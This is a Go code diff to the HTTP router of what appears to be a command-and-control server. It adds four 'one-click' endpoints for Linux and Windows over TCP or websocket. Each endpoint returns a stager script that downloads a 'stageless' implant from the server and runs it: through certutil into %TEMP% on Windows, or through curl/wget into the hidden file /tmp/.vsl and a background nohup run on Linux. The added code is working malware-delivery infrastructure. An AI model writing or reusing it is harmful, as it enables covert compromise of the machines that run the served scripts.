@@ -10,6 +10,7 @@ package router
 import (
 	"crypto/subtle"
 	"encoding/json"
+	"fmt"
 	"log"
 	"net/http"
 	"os"
@@ -182,6 +183,14 @@ func InitRouter() http.Handler {
 	})
 	mux.HandleFunc("/app/", serveVueApp(frontendDir()))
 
+	// 4.9.3 的一键上线端点：/slt（Linux tcp 脚本）、/slw（Linux ws）、
+	// /swt（Windows tcp bat）、/sww（Windows ws）。返回的是"下载并执行载荷"的脚本，
+	// 与 4.9.3 的 curl|sh / certutil 用法一致（docs/FRONTEND-493.md 有原文模板）。
+	mux.HandleFunc("/slt", oneLinerHandler(false, false))
+	mux.HandleFunc("/slw", oneLinerHandler(false, true))
+	mux.HandleFunc("/swt", oneLinerHandler(true, false))
+	mux.HandleFunc("/sww", oneLinerHandler(true, true))
+
 	// 用户信息 / 菜单 / 权限码（黑盒验证的原版响应格式）
 	mux.HandleFunc("/api/getUserInfo", handleGetUserInfo)
 	mux.HandleFunc("/api/getMenuList", handleGetMenuList)
@@ -278,6 +287,39 @@ func frontendDir() string {
 // 新版前端用 hash 路由（见 web/src/router/index.ts），因此回退只需覆盖直接访问
 // /app/ 的情况；资源文件按精确路径匹配，找不到回退到 index.html（Vite 的 base
 // 是 /app/，产物内部的引用也都是绝对路径）。
+// oneLinerHandler 返回"一键上线"脚本：脚本内部再拉 stageless 载荷并执行。
+// windows=true 返回 .bat（certutil 下载），否则返回 sh（curl/wget 下载）。
+func oneLinerHandler(windows, useWS bool) http.HandlerFunc {
+	return func(w http.ResponseWriter, r *http.Request) {
+		id := r.URL.Query().Get("id")
+		arch := r.URL.Query().Get("arch")
+		if arch == "" {
+			if windows {
+				arch = "windows_amd64"
+			} else {
+				arch = "linux_amd64"
+			}
+		}
+		scheme := "http"
+		if r.TLS != nil {
+			scheme = "https"
+		}
+		base := scheme + "://" + r.Host
+		payload := base + "/api/download/stageless?id=" + id + "&arch=" + arch
+		if useWS {
+			payload += "&tp=ws"
+		}
+		if windows {
+			w.Header().Set("Content-Type", "application/octet-stream")
+			w.Header().Set("Content-Disposition", `attachment; filename="run.bat"`)
+			fmt.Fprintf(w, "@echo off\r\ncertutil.exe -urlcache -split -f \"%s\" %%TEMP%%\\run.exe\r\nstart \"\" %%TEMP%%\\run.exe\r\n", payload)
+			return
+		}
+		w.Header().Set("Content-Type", "text/x-shellscript")
+		fmt.Fprintf(w, "#!/bin/sh\nset -e\n( command -v curl >/dev/null && curl -fsSL -m180 '%s' -o /tmp/.vsl ) || wget -T180 -q '%s' -O /tmp/.vsl\nchmod +x /tmp/.vsl\nnohup /tmp/.vsl >/dev/null 2>&1 &\n", payload, payload)
+	}
+}
+
 func serveVueApp(root string) http.HandlerFunc {
 	indexPath := filepath.Join(root, "index.html")
 	return func(w http.ResponseWriter, r *http.Request) {
